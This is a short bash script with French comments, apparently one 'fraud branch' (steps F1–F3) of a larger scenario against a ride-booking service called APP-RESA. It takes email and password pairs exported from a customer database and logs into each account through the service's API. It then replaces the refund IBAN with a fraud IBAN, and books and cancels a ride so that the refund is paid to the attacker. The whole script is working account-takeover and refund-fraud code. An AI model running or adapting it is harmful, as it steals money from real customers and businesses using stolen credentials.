#!/usr/bin/env bash
# BRANCHE FRAUDE - F1 (connexions multi-comptes), F2 (changement IBAN),
# F3 (reservation+annulation remboursee vers l'IBAN de fraude).
# Utilise l'API legitime d'APP-RESA avec les comptes issus de l'export A4.
set -euo pipefail
: "${APP_URL:?}"; : "${IBAN_FRAUDE:?}"
COMPTES="${COMPTES:-/opt/citybot/comptes_clients.csv}"  # copie depuis DB-CLIENTS
N="${1:-5}"   # nombre de comptes a abuser
curlj() { curl -sk -H "Content-Type: application/json" "$@"; }

echo "[F1-F3] Fraude aux remboursements sur $N comptes via $APP_URL"
tail -n +2 "$COMPTES" | head -n "$N" | while IFS=, read -r email mdp; do
  TOKEN=$(curlj -X POST "$APP_URL/api/login" -d "{\"email\":\"$email\",\"mot_de_passe\":\"$mdp\"}" | jq -r .token)
  [ "$TOKEN" = "null" ] && { echo "  $email : echec login"; continue; }
  # F2 : detourner l'IBAN de remboursement
  curlj -X POST "$APP_URL/api/profile" -H "Authorization: Bearer $TOKEN" \
        -d "{\"iban_rembours\":\"$IBAN_FRAUDE\"}" >/dev/null
  # F3 : reserver puis annuler -> remboursement vers l'IBAN de fraude
  CID=$(curlj -X POST "$APP_URL/api/reservations" -H "Authorization: Bearer $TOKEN" \
        -d '{"depart":"Gare","arrivee":"Port","montant":39.90}' | jq -r .course_id)
  curlj -X POST "$APP_URL/api/reservations/$CID/annuler" -H "Authorization: Bearer $TOKEN" >/dev/null
  echo "  $email : IBAN detourne + course $CID remboursee"
done
echo "[F3] Termine. Tous les remboursements pointent vers $IBAN_FRAUDE (beneficiaire recent)."
